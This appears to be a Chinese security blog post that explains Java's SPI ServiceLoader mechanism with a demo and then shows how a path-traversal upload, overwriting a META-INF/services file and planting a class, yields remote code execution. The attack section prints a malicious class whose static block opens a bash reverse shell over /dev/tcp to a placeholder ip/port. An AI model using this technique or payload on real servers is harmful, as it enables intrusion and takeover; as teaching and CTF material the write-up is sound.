# SPI机制

>最开始接触是springboot写文件rce里面的charsets遇到了，然后发现yaml的反弹也是使用的SPI机制

SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的API，或者换句话说，**SPI是一种服务发现机制** 

## demo

定义接口 SpiService.java

```java
package com.firebasky.spi;

public interface SpiService {
    public void hello();
}
```

实现接口的方法的类SpiServiceA.java (**需要注意SPI机制的实现类必须有一个无参构造方法**)

```java
package com.firebasky.spi;

public class SpiServiceA implements SpiService {
    public void hello() {
        System.out.println("SpiServiceA.Hello");
    }
}
```

SpiServiceB.java

```java
package com.firebasky.spi;

public class SpiServiceB implements SpiService {
    public void hello() {
        System.out.println("SpiServiceB.Hello");
    }
}
```

SpiTest

````java
package com.firebasky.spi;

import java.util.Iterator;
import java.util.ServiceLoader;

public class SpiTest {
    public static void main(String[] args) throws InterruptedException {
        try {
            init();
        } catch (Exception e) {
            System.out.println("error");
        }
    }
    public static void init(){
        ServiceLoader<SpiService> serviceLoader = ServiceLoader.load(SpiService.class);
        Iterator<SpiService> iterator = serviceLoader.iterator();
        while (iterator.hasNext()) {
            SpiService spiService = iterator.next();
            spiService.hello();
        }
    }
}
````

然后定义META-INF/services
![image-20211219220826826](https://user-images.githubusercontent.com/63966847/146678546-94e017c7-15a4-41f3-8082-4a0083c9b903.png)


然后run之后会输出

```
SpiServiceA.Hello
SpiServiceB.Hello
```

## 分析

也就是我们可以通过spi机制去获得实现接口的类并且实例化去调用方法。

调用**next方法**的时候，实际调用到的是，lookupIterator.nextService。它通过反射的方式，创建实现类的实例并返回。

![image-20211219221208548](https://user-images.githubusercontent.com/63966847/146678550-d158915b-fd15-4b20-a588-063ed76e7f8c.png)


![image-20211219221324358](https://user-images.githubusercontent.com/63966847/146678553-aede21be-261d-4077-9f21-a5ca8d60c4ec.png)


需要注意一点如何获得 **cn**这个变量勒，也就是spi实例化什么东西？这个其实是在 **META-INF/services/com.firebasky.spi.SpiService**中配置的。

## 新思路

那问题来了？

**环境存在路径穿越上传文件会造成rce?** 会的。

如何实现？

我们上传META-INF/services/com.firebasky.spi.SpiService文件并且覆盖其中的值，写入我们的恶意类的全类名比如：

```
com.firebasky.spi.evil
```

然后我们在target\classes\下上传我们的evil.class，然后让其在一次的执行spi的操作。就可以成功rce.

```java
#evil.java
package com.firebasky.spi;

import java.io.IOException;

public class evial implements SpiService{
    static {
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
            }catch (IOException ee){
            }
        }
    }
    @Override
    public void hello() {
        
    }
}
```

编译成class 之后上传到target\classes\

![image-20211219222014485](https://user-images.githubusercontent.com/63966847/146678561-9958bc94-f179-4440-97c4-fbdd2f7e03de.png)


在覆盖META-INF/services/com.firebasky.spi.SpiService

![image-20211219222049642](https://user-images.githubusercontent.com/63966847/146678565-b5a349de-0fa3-4285-ae4c-3ce8a893bae7.png)


之后执行一下SpiTest。
![image-20211219222131132](https://user-images.githubusercontent.com/63966847/146678572-60f7cfe5-32cf-4a40-9cca-b4a9d452d966.png)


其实也不是什么新思路,很多大师傅在实现写文件rce的时候就用到了,说不定ctf中可能遇到？？？

>参考： 
>
>https://www.cnblogs.com/xrq730/p/11440174.html
>
>https://www.jianshu.com/p/3a3edbcd8f24
